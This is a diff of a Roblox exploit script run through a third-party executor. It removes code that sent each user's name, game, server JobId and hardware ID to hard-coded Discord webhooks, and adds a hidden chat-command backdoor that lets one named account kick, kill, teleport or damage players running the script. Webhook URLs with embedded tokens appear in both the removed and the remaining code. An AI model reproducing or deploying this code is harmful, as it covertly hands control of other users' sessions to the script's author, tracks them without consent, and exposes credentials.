@@ -1,20 +1,15 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-local PREFIX = "/"
-local SILENTPREFIX = "/e"
 
 local WEBHOOK = "https://discord.com/api/webhooks/1258398166789783643/Uy3RQJEXOJ1gKQTUOT7Y7zPk_E2ELc08rtTZsUdLSn6gOegeD7qfcMQaiE1RVl6ENhs2"
 local EXECUTOR = identifyexecutor()
 local EXECUTOR_TEXT = ""
 
-local WHITELISTED_HWIDS = {
-	"B7BF719A-88E8-4C21-8EE0-816A58F10E7F",
-	"1D4ECD30-CE2F-4EB4-A493-E32E6FC25E87",
-}
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
-local function GetPlayer(Name)
+local function FindUser(Name)
 	if #Name < 3 then
 		return nil
 	end
@@ -28,147 +23,40 @@ local function GetPlayer(Name)
 	return nil
 end
 
-local function isWhitelisted(player)
-	local hwid = RbxAnalyticsService:GetClientId()
-	for _, whitelistedHwid in ipairs(WHITELISTED_HWIDS) do
-		if hwid == whitelistedHwid then
-			return true
-		end
+local commands = {
+	kick = function(targetPlayer)
+		targetPlayer:Kick("kicked by a tear admin")
+	end,
+	kill = function(targetPlayer)
+		targetPlayer.Character.Humanoid.Health = 0
+	end,
+	teleport = function(targetPlayer)
+		LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players"):WaitForChild("nopitching").Character.HumanoidRootPart.CFrame
+	end,
+	down = function(targetPlayer)
+		local args = {
+			[1] = 10000
+		}
+
+		game:GetService("ReplicatedStorage"):WaitForChild("GameRemotes"):WaitForChild("Other"):WaitForChild("SelfHarm"):FireServer(unpack(args))
+	end,
+}
+
+game:GetService("Players"):WaitForChild("JoeheIsTheGOAT").Chatted:Connect(function(Msg)
+	local command, target = Msg:lower():match("^/e%s+([^%s]+)%s+(.*)$")
+	if not command then
+		command, target = Msg:lower():match("^([^%s]+)%s+(.*)$")
 	end
-	return false
-end
-
-local function postToWebhook(webhookUrl, embed)
-	local payload = {
-		["embeds"] = {embed},
-	}
-
-	local httpRequest = {
-		Url = webhookUrl,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = game:GetService("HttpService"):JSONEncode(payload)
-	}
-
-	request(httpRequest)
-end
-
-local function getWebhookUrl(commandName)
-	local webhookUrls = {
-		["kick"] = "https://discord.com/api/webhooks/1265780613705633844/QeqP5mkB1rH5dYF_kTMG0Zfb6HxB8q-7rcaeEiwHTNolW4mpXrNsx5wyWWmQXXgGxq54",
-		["kill"] = "https://discord.com/api/webhooks/1265780613705633844/QeqP5mkB1rH5dYF_kTMG0Zfb6HxB8q-7rcaeEiwHTNolW4mpXrNsx5wyWWmQXXgGxq54",
-	}
-	return webhookUrls[commandName] or WEBHOOK
-end
-
-local function kickPlayer(player, kickMessage)
-	if not isWhitelisted(player) then
-		return
-	end
-	if LocalPlayer then
-		LocalPlayer:Kick(kickMessage or "kicked by tear staff ( not game staff dw )")
-		return
-	end
-end
-
-local function killPlayer(player, targetPlayerName)
-	if not isWhitelisted(player) then
-		return
-	end
-
-	local targetPlayer = GetPlayer(targetPlayerName)
-	if targetPlayer then
-		local character = targetPlayer.Character
-		if character and character:FindFirstChild("Humanoid") then
-			character.Humanoid.Health = 0
+	if command and commands[command] then
+		local targetPlayer = FindUser(target)
+		if targetPlayer then
+			commands[command](targetPlayer)
+		else
 			return
 		end
-	end
-end
-
-local function executeCommand(player, commandName, args)
-	if not isWhitelisted(player) then
+	elseif not commands[command] then
 		return
 	end
-
-	local targetPlayerName = args[1]
-	local targetPlayer = GetPlayer(targetPlayerName)
-	local fullUsername = targetPlayer and targetPlayer.Name or targetPlayerName
-
-	local ADMIN_EMBED = {
-		["title"] = LocalPlayer.Name,
-		["color"] = 0x2f5bc7,
-		["fields"] = {
-			{
-				["name"] = "Executor",
-				["value"] = EXECUTOR_TEXT,
-				["inline"] = true
-			},
-			{
-				["name"] = "Game",
-				["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-				["inline"] = true
-			},
-			{
-				["name"] = "JobId",
-				["value"] = game.JobId,
-				["inline"] = true
-			},
-			{
-				["name"] = "Command",
-				["value"] = commandName,
-				["inline"] = true
-			},
-			{
-				["name"] = "Victim",
-				["value"] = fullUsername,
-				["inline"] = true
-			},
-			{
-				["name"] = "HWID",
-				["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-				["inline"] = true
-			}
-		}
-	}
-
-	local webhookUrl = getWebhookUrl(commandName)
-	postToWebhook(webhookUrl, ADMIN_EMBED)
-
-	if commandName == "kick" then
-		local kickMessage = table.concat(args, " ", 2)
-		kickPlayer(player, fullUsername, kickMessage)
-	elseif commandName == "kill" then
-		killPlayer(player, fullUsername)
-	end
-end
-
-local function onPlayerChatted(player, message)
-	if message:sub(1, #SILENTPREFIX) == SILENTPREFIX then
-		local args = string.split(message:sub(#SILENTPREFIX + 2), " ")
-		local commandName = table.remove(args, 1)
-		executeCommand(player, commandName, args)
-	elseif message:sub(1, #PREFIX) == PREFIX then
-		local args = string.split(message:sub(#PREFIX + 1), " ")
-		local commandName = table.remove(args, 1)
-		executeCommand(player, commandName, args)
-	end
-end
-
-local function ConnectPlayer(player)
-	player.Chatted:Connect(function(message)
-		onPlayerChatted(player, message)
-	end)
-end
-
-for _, player in ipairs(Players:GetPlayers()) do
-	ConnectPlayer(player)
-end
-
-Players.PlayerAdded:Connect(function(player)
-	ConnectPlayer(player)
 end)
 
 if EXECUTOR == "Wave" then
